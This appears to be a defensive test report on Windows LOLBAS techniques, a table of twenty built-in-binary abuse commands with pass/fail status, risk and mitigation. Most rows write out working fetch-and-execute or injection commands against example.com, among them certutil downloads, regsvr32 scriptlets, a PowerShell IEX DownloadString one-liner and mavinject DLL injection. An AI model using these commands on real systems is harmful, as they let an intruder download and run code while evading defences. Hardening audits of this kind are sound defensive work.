# LOLBAS Test Report

| Command | Status | Why it's dangerous | How to mitigate |
|--------|--------|--------------------|-----------------|
| certutil -urlcache -split -f https://example.com/file.txt file.txt | âœ… Passed | Can download malicious files over HTTP | Block certutil.exe for standard users |
| bitsadmin /transfer myJob https://example.com/file.txt file.txt | âœ… Passed | Transfers files silently, often overlooked | Block or audit bitsadmin |
| mshta https://example.com/malware.hta | âœ… Passed | Executes remote scripts, can bypass defenses | Block mshta.exe with AppLocker |
| regsvr32 /s /n /u /i:https://example.com/file.sct scrobj.dll | âœ… Passed | Runs remote scriptlets (SCT), no disk footprint | Block regsvr32 or restrict internet access |
| wmic process call create "calc.exe" | âœ… Passed | Can execute any command or script | Limit wmic usage with group policies |
| rundll32 url.dll,FileProtocolHandler https://example.com | âœ… Passed | Can open URLs silently | Restrict rundll32 usage |
| powershell -Command "IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')" | âœ… Passed | Download & execute remote PowerShell scripts | Constrain PowerShell, enable AMSI |
| forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe | âœ… Passed | Abuses forfiles to execute commands | Restrict forfiles.exe |
| installutil /logfile= /LogToConsole=false /U https://example.com/bad.dll | âŒ Failed | Can execute code via .NET installers | Block installutil.exe for users |
| msbuild badproj.csproj | âŒ Failed | Compiles and executes malicious code | Block msbuild.exe for standard users |
| cmd /c calc.exe | âœ… Passed | Direct execution via cmd | Restrict cmd usage where possible |
| cscript //b //e:vbscript https://example.com/bad.vbs | âœ… Passed | Run remote VBScript files | Block cscript.exe / wscript.exe |
| wscript //b //e:jscript https://example.com/bad.js | âœ… Passed | Run remote JScript files | Block wscript.exe |
| hh.exe http://example.com/helpfile.chm | âœ… Passed | Executes HTML help files containing scripts | Block hh.exe |
| mavinject.exe 1234 /INJECTRUNNING bad.dll | âœ… Passed | Inject DLL into running process | Restrict mavinject to admins |
| dxcap.exe /c capture | âŒ Failed | Can be abused to load unsigned DLLs | Audit and control usage |
| at /interactive /every:M,T,W,Th,F cmd.exe | âœ… Passed | Schedules interactive task | Disable at.exe |
| esentutl /y https://example.com/payload.exe | âœ… Passed | Download file from remote | Restrict esentutl usage |
| makecab.exe file.txt file.cab | âœ… Passed | Compress & deliver malicious payloads | Audit makecab.exe usage |
| msxsl file.xml transform.xsl | âŒ Failed | Executes XSL script, can run code | Block msxsl.exe |
